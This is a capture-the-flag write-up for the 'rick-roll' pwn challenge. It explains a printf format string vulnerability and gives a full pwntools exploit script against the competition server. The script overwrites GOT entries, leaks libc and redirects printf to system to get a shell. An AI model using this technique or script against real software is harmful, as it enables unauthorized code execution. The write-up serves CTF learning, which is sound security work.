+++
authors = ["laozi"]
title = "pwn/rick-roll"
date = "2023-02-12"
+++

### The Vulnerability

This is a simple format string vulnerability. The program gets the user's
input then calls `printf()` on the user's input. This is a very common
vulnerability and a reason why developers should never be calling printf
directly on user input. Here's the code from the chall:

```c
int main(void) {
    if (main_called) {
        puts("nice try");
        return 1;
    }
    main_called = 1;
    setbuf(stdout, NULL);
    printf("Lyrics: ");
    char buf[256];
    fgets(buf, 256, stdin);
    printf("Never gonna give you up, never gonna let you down\nNever gonna run around and ");
    printf(buf);
    printf("Never gonna make you cry, never gonna say goodbye\nNever gonna tell a lie and hurt you\n");
    return 0;
}
```

So there's a small security measure that makes it so you can't call main twice.
That's fine though cause you can just jump into the middle of the main function.
So you can just use the pwntools library to create the format string writes for
you. You just need to find the offset of your input in the printf call. The
compiler also changes the last printf call to `puts()` so you can utilize that
knowledge to overwrite the GOT of puts with the location of `fgets()` in the `main()`
function. Then you can just get as much input as you want since it loops. Next step
is to leak libc and replace `printf()` with `system()`. Here's the exploit.

```python
#!/usr/bin/env python3
from pwn import *
elf = ELF("./rickroll_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")
context.terminal = ['tmux', 'splitw', '-h']
context.binary = elf
debug_script = '''
'''
def conn():
    if not args.REMOTE:
        p = process([elf.path])
        if args.D:
            gdb.attach(p, gdbscript=debug_script)
    else:
        p = remote("lac.tf", 31135)
    return p
p = conn()
p.recvuntil(b'Lyrics: ')
writes = {elf.got['puts']:0x00000000004011ac}
payload = fmtstr_payload(6, writes, numbwritten=0)
p.sendline(payload)
p.recv()
p.sendline(b"%p"*40)
p.recvline()
x = p.recvline()
libc.address = int(x[-15:-1],16) - 146698
print(hex(libc.address))
writes = {elf.got['printf']:libc.symbols['system']}
payload = fmtstr_payload(8, writes, numbwritten=0)
p.sendline(payload)
p.interactive()
```
